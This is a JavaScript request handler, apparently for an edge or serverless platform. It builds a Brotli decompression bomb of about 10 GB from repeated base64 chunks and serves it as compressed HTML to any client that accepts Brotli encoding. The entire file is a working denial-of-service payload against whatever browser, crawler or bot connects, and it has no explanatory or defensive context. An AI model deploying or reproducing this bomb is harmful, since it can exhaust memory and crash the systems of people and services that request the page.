const brotliBombBase64 = {
    Header: "z///f/gnAOKxQCD3/p/////wTwDEYQGA7v0/////4Z8AiMMiAN37f/7//8M/ARCHBQC69//8//",
    Seq128MB:
        "+HfwIgDgsAdO//+f//D/8EQBwWAOje//P//x/+CYA4LADQvf/n//8//BMAcVgAoHv/z///f/gnAOKwAED3/p/////wTwDEYQGA7v0/////4Z8AiMMCAN37f/7//8M/ARCHBQC69//8//",
    Footer: "+HfwIgDgsAdO//+f//D/8EQBwWAOje//P//x/+CYA4LADQvf/n//8//BMAcVgAoHv/Pw==",
};

function base64ToArrayBuffer(base64) {
    const binaryStr = atob(base64);
    const len = binaryStr.length;
    const buffer = new ArrayBuffer(len);
    const view = new Uint8Array(buffer);

    for (let i = 0; i < len; i++) {
        view[i] = binaryStr.charCodeAt(i);
    }
    return buffer;
}

function makeBrotliBombBase64(size) {
    const base64 = [];
    for (let i = 0; i < size; i++) {
        base64.push(brotliBombBase64.Header);
        base64.push(brotliBombBase64.Seq128MB);
    }
    base64.push(brotliBombBase64.Footer);
    return base64.join("");
}

const brotliBomb = base64ToArrayBuffer(makeBrotliBombBase64(79)); // 10GB

export default async function handleRequest(request) {
    // Get Accept-Encoding from request header
    const acceptEncoding = request.headers.get("Accept-Encoding");

    if (
        acceptEncoding &&
        !acceptEncoding.includes("br") &&
        !acceptEncoding.includes("*")
    ) {
        return new Response("Require Accept-Encoding: br", { status: 406 });
    }
    return new Response(brotliBomb, {
        encodeBody: "manual",
        headers: {
            "Content-Encoding": "br",
            "Content-Length": brotliBomb.byteLength.toString(),
            "Content-Type": "text/html",
            // Vary: "Accept-Encoding",
            "Cache-Control": "no-store, no-cache, must-revalidate, max-age=0",
            Pragma: "no-cache",
            Expires: "Thu, 01 Jan 1970 00:00:00 GMT",
        },
    });
}
